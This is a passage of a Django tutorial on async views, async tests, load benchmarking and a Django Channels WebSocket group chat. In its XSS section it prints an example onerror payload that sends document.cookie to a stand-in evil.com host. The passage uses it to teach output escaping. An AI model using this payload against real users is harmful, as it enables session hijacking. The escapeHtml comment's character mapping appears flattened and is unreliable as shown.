Part What it means uvicorn ASGI server (the async counterpart of gunicorn) notes_project.asgi Python module: notes_project/asgi.py :application Object in the module (application = ProtocolTypeRouter(...)) --reload Auto-restart on file changes (dev only!) --port 8001 Port 8001 (8000 is taken by runserver)

docs.title: Expected warning (NOT an error)
docs.text:
WARNING:  ASGI 'lifespan' protocol appears unsupported.

Uvicorn tries the lifespan protocol (startup/shutdown hooks) → Django doesn't implement it → uvicorn logs a WARNING and keeps running. This is normal. The chat and async views work fully. Ignore this message.

Open your browser: http://127.0.0.1:8001/

Now you can compare: - http://127.0.0.1:8000/notes/ — sync view (WSGI) - http://127.0.0.1:8001/async/notes/ — async view (ASGI) - http://127.0.0.1:8001/groups/ — group chat (WebSocket)

Important: Both servers connect to the SAME db.sqlite3. The data is the same. The execution architecture is different.

docs.title: 08. URL comparison table
docs.text: Sync URL Async URL What we compare GET /notes/ GET /async/notes/ Note list, lazy ORM vs async for GET /notes/<pk>/ GET /async/notes/<pk>/ Note details, .get() vs .aget() GET/POST /notes/new/ GET/POST /async/notes/create/ Form + create_note vs sync_to_async GET/POST /notes/<pk>/delete/ GET/POST /async/notes/<pk>/delete/ .delete() vs .adelete() (no separate URL) POST /async/notes/<pk>/pin/ .update(F(...)) vs .aupdate(F(...))

docs.title: 09. How async_selectors.py works
docs.text:
Open the file: hello_app/async_selectors.py

Compare it with the original: hello_app/selectors.py

docs.title: Key idea: lazy vs evaluation
docs.text:
# selectors.py (sync) — original
def get_user_notes(user, ...):
    qs = Note.objects.filter(Q(user=user) | ...)
    qs = qs.select_related('notebook', 'group')
    qs = qs.prefetch_related('tags')
    return qs.order_by('-is_pinned', ...)
    # ↑ SQL HAS NOT RUN YET — returns a lazy QuerySet
    # SQL runs in views.py when: for note in notes: ...

# async_selectors.py — async version
def async_get_user_notes(user, ...):
    qs = Note.objects.filter(Q(user=user) | ...)
    qs = qs.select_related('notebook', 'group')
    qs = qs.prefetch_related('tags')
    return qs.order_by('-is_pinned', ...)
    # ↑ THE SAME LOGIC — also a lazy QuerySet
    # SQL runs in async_views.py when: async for note in notes_qs: ...
Django ORM method Type Does SQL run? .filter(...) Lazy ❌ No .select_related(...) Lazy ❌ No .prefetch_related(...) Lazy ❌ No .annotate(...) Lazy ❌ No .order_by(...) Lazy ❌ No .get() Eval ✅ Yes (sync — blocks) .aget() Eval ✅ Yes (async — doesn't block) .count() Eval ✅ Yes (sync) .acount() Eval ✅ Yes (async) for obj in qs Eval ✅ Yes (sync — blocks) async for obj in qs Eval ✅ Yes (async — doesn't block)

docs.title: async def only where there is real SQL
docs.text:
# async_get_user_notes — a plain def (lazy QuerySet, SQL doesn't run)
def async_get_user_notes(user, ...):
    return Note.objects.filter(...).select_related(...).order_by(...)

# async_get_note_detail — async def (real SQL via .aget())
async def async_get_note_detail(user, note_id):
    return await Note.objects.filter(...).select_related(...).aget(id=note_id)
    #      ↑ await: SQL runs asynchronously, the event loop is free while we wait

docs.title: 10. How async_services.py works
docs.text:
Open the file: hello_app/async_services.py

Compare it with the original: hello_app/services.py

docs.title: Two approaches: sync_to_async vs native async
docs.text:
# services.py (sync) — original
def create_note(*, user, title, ...):
    with transaction.atomic():         # ← transaction
        note = Note.objects.create(...)
        note.tags.set(valid_tags)
    return note

# async_services.py — async via sync_to_async
# You can't simply make it async def because of transaction.atomic()
async_create_note = sync_to_async(create_note, thread_sensitive=True)
# ↑ Wraps the sync create_note so it can be safely called from an async view
# sync_to_async runs create_note in a dedicated OS thread
# the event loop is free while the thread runs the transaction

Compare the three approaches in async_services.py:

Operation Approach Why async_create_note sync_to_async(create_note) transaction.atomic() isn't supported natively in async async_delete_note await note.adelete() Simple DELETE, native async ORM method async_toggle_pin_note await qs.aupdate(is_pinned=~F(...)) Atomic UPDATE, native async, without loading the object

docs.title: sync_to_async: what it looks like in memory
docs.text:
Async View (event loop thread)
    │
    │  await async_create_note(...)       ← the view is suspended
    │
    ├─→ sync_to_async: hands off to a worker thread
    │
    │  the event loop serves OTHER requests ←
    │
    │  Worker Thread: runs create_note() + transaction.atomic()
    │
    │  Worker Thread: returns note ───────┐
    │                                     │
    │  the event loop resumes the view ───┘
    │
    └─→ note = <Note object>  ← the view continues

docs.title: 11. How async_views.py works
docs.text:
Open the file: hello_app/async_views.py

Compare it with the original: hello_app/views.py

docs.title: Key syntax differences
docs.text:
# views.py (sync) — original
@login_required
def note_list(request):
    notes = selectors.get_user_notes(request.user)        # lazy QuerySet
    # On the line below the template evaluates the QuerySet via a for loop (sync)
    return render(request, 'hello_app/note_list.html', {'notes': notes})

# async_views.py — async version
async def async_note_list(request):
    if not request.user.is_authenticated:         # explicit auth check
        return redirect('login')

    notes_qs = async_selectors.async_get_user_notes(request.user)  # lazy (sync def)

    notes = [note async for note in notes_qs]     # async for → SQL runs here
    #        ↑ the await happens inside async for
    #          the event loop is free while the DB responds

    return render(request, 'hello_app/note_list.html', {'notes': notes})
    #     ↑ render() is sync, but safe in async def (Django 5.x)

docs.title: Where the awaits are and why
docs.text: Line await Why note = await async_selectors.async_get_note_detail(...) ✅ Inside aget() — real SQL notes = [note async for note in notes_qs] ✅ (implicit) Iterating a QuerySet = SQL note = await async_services.async_create_note(...) ✅ sync_to_async — runs in a thread await async_services.async_delete_note(note) ✅ adelete() — real SQL await async_services.async_toggle_pin_note(note) ✅ aupdate() — real SQL form = NoteForm(request.POST, user=request.user) ❌ The form is lazy, no heavy I/O form.is_valid() ❌ CPU validation, no I/O return render(...) ❌ Django 5.x renders a sync template safely return redirect(...) ❌ Just an HttpResponse with 302, no I/O

docs.text:
# Only the original sync tests (129 tests)
python manage.py test hello_app.tests.test_views -v 2

# Only the new async tests
python manage.py test hello_app.tests.test_async_views -v 2

# All tests together (sync + async)
python manage.py test hello_app -v 1

# A specific async class
python manage.py test hello_app.tests.test_async_views.AsyncNoteListViewTest -v 2

# Stop at the first failure
python manage.py test hello_app --failfast -v 2

docs.title: Key differences in async tests
docs.text:
Open side by side: - hello_app/tests/test_views.py — sync tests (NoteListViewTest) - hello_app/tests/test_async_views.py — async tests (AsyncNoteListViewTest)

# test_views.py — sync test
class NoteListViewTest(TestCase):

    def setUp(self):
        # Sync ORM — always OK in setUp
        self.alice = User.objects.create_user('alice', password='pass123')

    def test_redirects_to_login(self):
        # Sync HTTP request
        response = self.client.get(reverse('hello_app:note_list'))
        self.assertEqual(response.status_code, 302)

    def test_auth_user_gets_200(self):
        self.client.force_login(self.alice)   # sync login
        response = self.client.get(reverse('hello_app:note_list'))
        self.assertEqual(response.status_code, 200)

# test_async_views.py — async test
class AsyncNoteListViewTest(TestCase):  # TestCase (not AsyncTestCase)

    def setUp(self):
        # setUp is sync, ORM without await — OK
        self.alice = User.objects.create_user('alice_async', password='pass123')

    async def test_redirects_to_login(self):
        client = AsyncClient()                  # AsyncClient instead of self.client
        response = await client.get(            # await client.get()
            reverse('hello_app:async_note_list')
        )
        self.assertEqual(response.status_code, 302)

    async def test_auth_user_gets_200(self):
        client = AsyncClient()
        await client.force_login(self.alice)    # await force_login
        response = await client.get(
            reverse('hello_app:async_note_list')
        )
        self.assertEqual(response.status_code, 200)
Concept Sync test Async test Base class TestCase TestCase (the same!) setUp def setUp(self) def setUp(self) (sync!) test_ methods def test_*(self) async def test_*(self) HTTP client self.client AsyncClient() GET request self.client.get(url) await client.get(url) Login self.client.force_login(user) await client.force_login(user) ORM in a test Note.objects.create(...) await sync_to_async(Note.objects.create)(...)

Why TestCase and not AsyncTestCase? AsyncTestCase is a subclass of SimpleTestCase and doesn't support transactions. TestCase wraps every test in a transaction (rollback after the test). Django 4.1+ supports async def test_* in a regular TestCase. That's why we use TestCase with async def test_* methods.

docs.title: 13.1. Testing in the browser
docs.text:
Step 1: Start both servers at the same time

# Terminal 1 (sync)
python manage.py runserver

# Terminal 2 (async)
uvicorn notes_project.asgi:application --reload --port 8001

Step 2: Sign up or log in at http://127.0.0.1:8000/

Step 3: Open both URLs in different tabs

Tab 1: http://127.0.0.1:8000/notes/           ← sync
Tab 2: http://127.0.0.1:8001/async/notes/     ← async

Step 4: Create a note via sync (/notes/new/) and check that it is visible in async (/async/notes/).

Both servers connect to one db.sqlite3 — the data is shared.

docs.title: 13.2. Testing in Postman
docs.text:
What is a CSRF token? CSRF (Cross-Site Request Forgery) is protection against cross-site request forgery. Django checks a special token in every POST request. The browser receives the token automatically via a cookie. In Postman you have to do it manually.

Step 1: Get the CSRF token with a GET request in Postman

Django sets the csrftoken cookie on the first GET request to any page.

GET http://127.0.0.1:8000/

In the response, Postman will show a Cookies tab: - Find the cookie named csrftoken - Copy its value (a long string of letters and digits)

Or through the browser (if it's already open): - F12 → Application → Cookies → http://127.0.0.1:8000 - Copy the csrftoken value

Django automatically enables the cookie manager in Postman (Settings → Cookies). After the first GET request, the csrftoken cookie will appear in the Postman Cookie Jar.

Step 2: Log in via Postman

POST http://127.0.0.1:8000/accounts/login/
Content-Type: application/x-www-form-urlencoded
Body (x-www-form-urlencoded):
  username      alice
  password      pass123
  csrfmiddlewaretoken   <csrftoken value from step 1>

After a successful login: - Postman will save the sessionid cookie automatically (via the Cookie Jar) - Response status: 302 Redirect (to the home page)

Step 3: GET the list of async notes

GET http://127.0.0.1:8001/async/notes/

Postman will automatically send the sessionid and csrftoken cookies (from the Cookie Jar). You'll see an HTML page with the list of notes.

Step 4: POST to create a note via the async view

POST http://127.0.0.1:8001/async/notes/create/
Content-Type: application/x-www-form-urlencoded
Headers:
  X-CSRFToken    <csrftoken value>
Body (x-www-form-urlencoded):
  title         Test note via Postman
  content       Note content
  priority      1
Body:
  title=Test note via Postman
  content=Content
  priority=1

docs.title: 14. Benchmark: what you can and can't measure
What you should NOT expect
docs.text:
# ❌ One request proves nothing
curl http://127.0.0.1:8000/notes/        # Sync: 45ms
curl http://127.0.0.1:8001/async/notes/  # Async: 48ms
# "Async is slower!" — a FALSE conclusion

Async has overhead from the event loop. For a single request, sync may be faster.

docs.title: What really shows the difference
docs.text:
The difference is visible under concurrent load (50+ simultaneous requests):

# 1000 requests, 50 concurrent (requires apache-httpd or apache2-utils)
ab -n 1000 -c 50 http://127.0.0.1:8000/notes/         # sync
ab -n 1000 -c 50 http://127.0.0.1:8001/async/notes/   # async

Note: SQLite is not an ideal DB for an async performance benchmark. SQLite has a global write lock. For a real async benchmark use PostgreSQL with a connection pool.

docs.title: Locust for a learning benchmark
docs.text:
pip install locust

Create locustfile.py next to manage.py:

from locust import HttpUser, task, between

class SyncUser(HttpUser):
    host = "http://127.0.0.1:8000"
    wait_time = between(0.1, 0.5)

    @task
    def view_notes(self):
        self.client.get("/notes/")


class AsyncUser(HttpUser):
    host = "http://127.0.0.1:8001"
    wait_time = between(0.1, 0.5)

    @task
    def view_async_notes(self):
        self.client.get("/async/notes/")

locust -f locustfile.py
# Open http://localhost:8089 and start the test

docs.title: ❌ Mistake 1: Sync ORM in an async view
docs.text:
async def bad_note_detail(request, pk):
    note = Note.objects.get(pk=pk)  # ← SynchronousOnlyOperation!
    return render(request, 'note_detail.html', {'note': note})

Mistake: .get() is sync SQL. In an async context Django raises an exception.

# ✅ Correct
async def good_note_detail(request, pk):
    note = await Note.objects.aget(pk=pk)  # async counterpart of .get()
    return render(request, 'note_detail.html', {'note': note})

docs.title: ❌ Mistake 2: requests.get() in an async view
docs.text:
import requests

async def bad_view(request):
    # requests.get() is sync! It blocks the whole event loop while waiting for the response
    data = requests.get("https://api.example.com/data").json()
    return JsonResponse(data)

Mistake: The whole server "freezes" for all other users during the HTTP request.

# ✅ Correct: httpx.AsyncClient
import httpx

async def good_view(request):
    async with httpx.AsyncClient() as client:
        # await: the view is suspended, the event loop serves others
        response = await client.get("https://api.example.com/data")
    return JsonResponse(response.json())

docs.title: ❌ Mistake 3: time.sleep() in an async view
docs.text:
import time

async def bad_delay_view(request):
    time.sleep(2)  # Blocks the whole event loop for 2 seconds!
    return HttpResponse("done")

# ✅ Correct: asyncio.sleep()
import asyncio

async def good_delay_view(request):
    await asyncio.sleep(2)  # Hands control back to the event loop
    return HttpResponse("done")

docs.title: Final thought
docs.text:
Async Django is a tool, not a coding style.

Sync Django fits most projects: CRUD, admin, a blog, an API. Async Django is justified when there is a real I/O bottleneck: parallel external API requests, WebSockets, streaming, high concurrency.

This learning project shows: one and the same result, two different architectures. Choose according to the task.

docs.title: 18. Real-time group chat: why async is the only correct choice here
18.1. The problem: why HTTP doesn't fit a chat
docs.text:
HTTP is a "request → response → closed" protocol. Each browser request opens a new TCP connection, the server responds and closes it.

HTTP flow (classic):
  Browser ── GET /groups/7/chat/ ──► Django view → HttpResponse → [connection closed]
  Browser ── GET /groups/7/chat/ ──► Django view → HttpResponse → [connection closed]
  ...

The problem for a chat: the server can't send a message to the browser FIRST. If Olya writes "Hi", Viktor's browser learns about it only on the next request. When should the next request be made? We don't know.

Two "hacky" HTTP-based workarounds — and why they're bad:

Approach How it works Problem Polling The browser requests /new-messages/ every 2 seconds 1000 users = 500 requests/sec. A message arrives with a delay of up to 2 sec Long polling The browser sends a request, the server "holds" it open until a new message appears 1000 users = 1000 blocked threads on the server

Long polling + sync Django = a concurrency disaster:

Sync Django: one thread = one active request
1000 users in the chat → 1000 threads blocked (waiting for new messages)
Django thread pool exhausted → the rest of the site doesn't respond

docs.title: 18.2. The solution: WebSocket
docs.text:
WebSocket is a persistent bidirectional TCP connection between the browser and the server. It's established via an HTTP Upgrade handshake (once), after which HTTP is no longer needed.

WebSocket flow:
  Browser ══════════ PERSISTENT TCP CONNECTION ═════════ Server
  ↑ Either side can send data at any moment
  ↑ One connection lives the whole time the tab is open

  Olya:   ws.send({content: "Hi!"})       ──────────────► consumer.receive()
  Server: consumer.send({author: "Olya"}) ──────────────► ws.onmessage (in Viktor's browser)
  Server: consumer.send({author: "Olya"}) ──────────────► ws.onmessage (in Masha's browser)

The browser WebSocket API is built in, no libraries needed:

// Open a connection
const ws = new WebSocket('ws://127.0.0.1:8001/ws/groups/7/chat/')
//                        ↑ ws:// for HTTP, wss:// for HTTPS

ws.onopen    = () => { /* connection established */ }
ws.onmessage = (e) => { const data = JSON.parse(e.data) }  // the server sent something
ws.onclose   = (e) => { /* close code: 1000=normal, 1006=abnormal */ }

ws.send(JSON.stringify({ content: "Hi!" }))  // send to the server

docs.title: 18.3. Why WebSocket and sync Django don't mix
docs.text:
A sync view in Django: processed the request → returned a response → the thread is free. A WebSocket connection: opened → stays open for hours.

Sync Django + WebSocket:
  1000 users in the chat → 1000 threads blocked until the tabs are closed
  Thread pool exhausted → the rest of the site doesn't respond

  Solve it with more threads? 1000 OS threads ≈ 8 GB RAM just for stacks
  This doesn't scale.

Async + WebSocket is the right architecture:

Async Django Channels:
  1000 users in the chat → 1000 Consumer objects in memory
  Each Consumer is a coroutine that "sleeps" while there are no messages
  The event loop serves active connections (where there are messages)
  The CPU is busy only when there is something to process

  1000 open connections ≈ RAM for 1000 Python objects (a few MB)

This is the key difference between sync and async for long-lived connections:

Sync Async Model One thread = one connection One event loop = thousands of coroutines 1000 users 1000 OS threads (~8 GB RAM for stacks) 1000 coroutines (a few MB) CPU while there are no messages The thread is blocked (waiting) The event loop serves others Scalability Limited by the thread pool Limited only by RAM and the channel layer

docs.title: 18.4. Architecture: how Django Channels fits into Django
docs.text:
Django Channels is a package that adds WebSocket support to Django via ASGI.

flowchart TD
    Browser["Browser"]
    Uvicorn["Uvicorn ASGI :8001"]
    PTR["ProtocolTypeRouter<br>asgi.py"]
    Auth["AuthMiddlewareStack<br>(reads session cookie → User)"]
    WS_Router["WebSocket URLRouter<br>routing.py"]
    Consumer["GroupChatConsumer<br>consumers.py"]
    DjangoHTTP["Django HTTP<br>(regular views)"]
    ChannelLayer["InMemoryChannelLayer<br>(pub/sub in-process)"]
    DB[("SQLite DB")]

    Browser -->|"HTTP GET /notes/"| Uvicorn
    Browser -->|"WS ws://…/ws/groups/7/chat/"| Uvicorn
    Uvicorn --> PTR
    PTR -->|"protocol=http"| DjangoHTTP
    PTR -->|"protocol=websocket"| Auth
    Auth --> WS_Router
    WS_Router --> Consumer
    Consumer <-->|"group_add / group_send / group_discard"| ChannelLayer
    ChannelLayer -->|"chat_message()"| Consumer
    Consumer -->|"database_sync_to_async"| DB

    classDef step     fill:#eceff1,stroke:#546e7a,stroke-width:1px;
    classDef success  fill:#e8f5e9,stroke:#2e7d32,stroke-width:2px;
    classDef warning  fill:#fff8e1,stroke:#e65100,stroke-width:2px;

    class Browser,Uvicorn,PTR,WS_Router,DjangoHTTP,DB step;
    class Auth,ChannelLayer warning;
    class Consumer success;

Key components:

Component Role Counterpart in HTTP Django ProtocolTypeRouter Tells HTTP and WebSocket apart and routes them ROOT_URLCONF AuthMiddlewareStack Reads the session cookie, loads User into scope @login_required WebSocket URLRouter Routes the WebSocket URL to a Consumer urls.py Consumer Handles the WebSocket connection the whole time view InMemoryChannelLayer Pub/sub: delivers messages to all Consumers of one group (no counterpart)

docs.title: 18.5. Consumer: lifecycle and methods
docs.text:
Open the file: hello_app/consumers.py

A Consumer is a class that inherits from AsyncWebsocketConsumer. Unlike a view (one request → one response), a Consumer lives for the whole connection.

Consumer lifecycle:
  1. connect()      ← the browser opened the connection (once)
  2. receive()      ← the browser sent a message (N times)
     receive()      ← ...
     receive()      ← ...
  3. chat_message() ← the channel layer delivered a broadcast from another consumer (N times)
     chat_message() ← ...
  4. disconnect()   ← the browser closed the connection (once)

docs.title: connect(): what happens when the connection opens
docs.text:
async def connect(self):
    # 1. Read the user — AuthMiddlewareStack has already loaded it into scope
    self.user = self.scope['user']

    # 2. Reject anonymous users (await close() → WS close frame to the browser)
    if not self.user.is_authenticated:
        await self.close(); return

    # 3. Read group_pk from the URL (the counterpart of kwargs in a view)
    self.group_pk = int(self.scope['url_route']['kwargs']['group_pk'])

    # 4. Check group membership (database_sync_to_async → ORM in a thread)
    if not await self.check_membership(self.group_pk, self.user):
        await self.close(); return

    # 5. Subscribe to the "broadcasting group" in the channel layer
    self.room_group_name = f"chat_group_{self.group_pk}"
    await self.channel_layer.group_add(self.room_group_name, self.channel_name)
    #                                                         ↑ unique ID of this consumer

    # 6. Accept the connection (without accept() → the browser gets a 403)
    await self.accept()

    # 7. Send the last 50 messages from the DB (history)
    for msg in await self.load_history(self.group_pk):
        await self.send(text_data=json.dumps({'type': 'history', ...}))

docs.title: receive(): a new message from the browser
docs.text:
async def receive(self, text_data):
    data = json.loads(text_data)         # JS: socket.send(JSON.stringify({content: "Hi"}))
    content = data.get('content', '').strip()

    # Save to the DB
    msg = await self.save_message(self.group_pk, self.user, content)

    # Broadcast to ALL group subscribers via the channel layer
    await self.channel_layer.group_send(
        self.room_group_name,
        {
            'type': 'chat_message',   # → Django Channels will call the chat_message() method
            'author': self.user.username,
            'content': content,
            'timestamp': msg.timestamp.isoformat(),
        }
    )

docs.title: chat_message(): we received a broadcast from the channel layer
docs.text:
async def chat_message(self, event):
    # event['type'] = 'chat_message' → this method
    # Task: forward the JSON to OUR browser
    await self.send(text_data=json.dumps({
        'type': 'message',
        'author': event['author'],
        'content': event['content'],
        'timestamp': event['timestamp'],
    }))

An important detail: type: 'chat_message' in group_send() → Django Channels automatically looks for the chat_message() method in the Consumer. A dot in the type → an underscore (e.g. 'type': 'chat.message' → the chat_message() method).

docs.title: 18.6. How the channel layer delivers messages to all participants
docs.text:
InMemoryChannelLayer implements the pub/sub (publish/subscribe) pattern.

Channel layer state when 3 users have opened the chat of group 7:

  Viktor's channel_name: "specific.abc123"
  Olya's channel_name:   "specific.def456"
  Masha's channel_name:  "specific.ghi789"

  group "chat_group_7" → subscribers: ["specific.abc123", "specific.def456", "specific.ghi789"]

Olya sends "Hi":
  Olya's consumer: group_send("chat_group_7", {type: "chat_message", content: "Hi"})
                    │
                    ├── the channel layer finds all subscribers of chat_group_7
                    │
                    ├── delivers the event to Viktor's consumer → chat_message() → send("Hi")
                    ├── delivers the event to Olya's consumer   → chat_message() → send("Hi")
                    └── delivers the event to Masha's consumer  → chat_message() → send("Hi")

Result: "Hi" appears simultaneously in all three browsers.

InMemoryChannelLayer is in-process, for a single server. For production with several servers, channels-redis (a channel layer over Redis) is used, but for a learning project InMemory is enough.

docs.title: 18.7. database_sync_to_async: why the ORM needs a wrapper in a Consumer
docs.text:
The Django ORM is synchronous. It cannot run directly in the asyncio event loop.

# ❌ WRONG — SynchronousOnlyOperation exception
async def connect(self):
    group = Group.objects.get(pk=self.group_pk)   # sync ORM in an async context!

# ✅ CORRECT — database_sync_to_async
@database_sync_to_async
def check_membership(self, group_pk, user):
    # This function is a regular sync def
    # database_sync_to_async runs it in the Django thread pool (worker thread)
    # the event loop is free while the thread runs the SQL
    return Group.objects.get(pk=group_pk).user_set.filter(pk=user.pk).exists()

async def connect(self):
    is_member = await self.check_membership(self.group_pk, self.user)
    #           ↑ await: the view is suspended, the event loop serves others

A critical detail in load_history: we return a list, not a QuerySet:

@database_sync_to_async
def load_history(self, group_pk):
    qs = ChatMessage.objects.filter(group_id=group_pk).order_by('-timestamp')[:50]
    return list(qs.values('id', 'author__username', 'content', 'timestamp'))
    #      ↑ list() runs the SQL HERE, in the worker thread
    #      A QuerySet is lazy and bound to the thread where it was created
    #      If you return a QuerySet and iterate it in an async context → error
Wrapper When to use In this project database_sync_to_async Django ORM (optimized for Django DB connections) check_membership, load_history, save_message sync_to_async Any sync code without the DB (in async_services.py for create_note)

docs.title: 18.8. Vanilla JS WebSocket client
docs.text:
Open the file: hello_app/static/hello_app/js/group_chat.js

The JS client manages the connection state and the display of messages.

Connection state (status bar in the UI):
  connecting → connected → (on failure) disconnected → (auto-reconnect) connecting → ...

  1000 = normal closure  → do NOT reconnect
  1001 = page is closing → do NOT reconnect
  1006 = failure (internet, server crashed) → reconnect after 3 seconds

Two types of messages from the server:

type When From what What is displayed history Right after connect() load_history() in the consumer The last 50 messages from the DB message Real-time chat_message() in the consumer A new message from anyone

XSS protection is mandatory for a chat:

// ❌ DANGEROUS: user content directly in innerHTML
div.innerHTML = data.content  // an attacker sends <script>...</script> → XSS

// ✅ CORRECT: escapeHtml() before any user content
wrapper.innerHTML = `<div class="chat-content">${escapeHtml(data.content)}</div>`
// escapeHtml replaces: & → &  < → <  > → >  " → "  ' → '

Without escapeHtml() an attacker can send the message: 

<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
and obtain the cookies of all chat participants (Session Hijacking).

docs.title: 18.9. The full flow: from pressing Enter to the message appearing for everyone
docs.text:
sequenceDiagram
    participant Viktor_JS as Viktor's browser (JS)
    participant Viktor_WS as Viktor's Consumer
    participant ChannelLayer as InMemoryChannelLayer
    participant Olya_WS as Olya's Consumer
    participant Olya_JS as Olya's browser (JS)
    participant DB as SQLite

    Viktor_JS->>Viktor_WS: ws.send({content: "Hi!"})
    Viktor_WS->>DB: save_message() via database_sync_to_async
    DB-->>Viktor_WS: ChatMessage(id=42, timestamp=...)
    Viktor_WS->>ChannelLayer: group_send("chat_group_7", {type:"chat_message", ...})
    par channel layer broadcast
        ChannelLayer->>Viktor_WS: chat_message(event)
        ChannelLayer->>Olya_WS: chat_message(event)
    end
    Viktor_WS->>Viktor_JS: ws.onmessage({type:"message", author:"Viktor", ...})
    Olya_WS->>Olya_JS: ws.onmessage({type:"message", author:"Viktor", ...})
    Note over Viktor_JS,Olya_JS: "Hi!" appears simultaneously in both browsers

This whole path happens without a single HTTP request. Only WebSocket frames.

docs.title: 18.10. Running and testing the chat
docs.text:
Step 1: Start the ASGI server (the chat requires ASGI, not runserver):

uvicorn notes_project.asgi:application --reload --port 8001

Step 2: Open http://127.0.0.1:8001/ and log in.

Step 3: Go to any group (http://127.0.0.1:8001/groups/) and click «Відкрити чат».

Step 4: Open the same URL in a second tab (or another browser) as a different user.

Step 5: Send a message — it will appear in both tabs instantly without reloading.

To see the difference: try to imagine the same chat via polling (GET every 2 sec). Open the Network tab in DevTools: with WebSocket there's one row (the WS connection). With polling there's a new row every 2 seconds, even when nobody is writing anything.

docs.title: 18.11. Summary: why the chat is the perfect demonstration of async
docs.text:
The async views in this project (sections 04–12) show how to write async code. Technically, the same result can be achieved with sync.

The group chat shows why async exists — here sync is architecturally impossible:

Chat requirement Sync Django Async Django Channels The server sends data without a request from the browser ❌ Impossible ✅ consumer.send() The connection stays open for hours ❌ Blocks a thread ✅ The coroutine "sleeps" 1000 users at the same time ❌ Needs 1000 threads ✅ 1000 lightweight coroutines Broadcasting one message to everyone ❌ No mechanism ✅ channel_layer.group_send()

It's not "async is better" — it's "for long-lived connections sync doesn't fit architecturally". That's why the group chat is the best demonstration: not a stylistic preference, but a necessity.

docs.title: 19.1. Why Docker for this project
docs.text:
Without Docker, Python adds all packages from .venv to sys.path. If one workspace has several Django projects with the same package names (notes_project, notes_app), Python may load the wrong project. Docker solves this once and for all: the container has only /app in sys.path, no third-party packages.

Without Docker:                     With Docker:
sys.path = [                        sys.path = [
  lesson_Django_authentication/..., ← /app ← only notes_chat_app
  lesson_Django_Async/...,          ]
  ...                               WORKDIR /app → ENV PYTHONPATH=/app
]

docs.title: CrispyNotes — Final Project: Production Stack
docs.text:
This tutorial walks you through a full production-ready stack: PostgreSQL → Django → Redis → Channels → nginx → ngrok.

The project — notes_chat_app — combines all the previous modules: templates + auth + tests + async + WebSocket + Docker + nginx. You'll see how all the components work together in a real system.

Result: an application with PostgreSQL, a real-time group chat, Selenium E2E tests and public access through ngrok.

Architecture (read before the code) - 01 · OVERVIEW — what and why in a production stack - 02 · DOCKER COMPOSE — the chain of services and dependencies - 03 · POSTGRESQL — from SQLite to a production DB - 04 · REDIS + CHANNELS — the channel layer for WebSocket - 05 · NGINX — reverse proxy and static files - 06 · NGROK — public access and CSRF - 07 · ENTRYPOINT — the container startup chain

Models and domain logic - 08 · MODELS — the full data schema - 09 · SERVICES + SELECTORS — the business logic layer - 10 · CONSUMERS — WebSocket group chat

services:
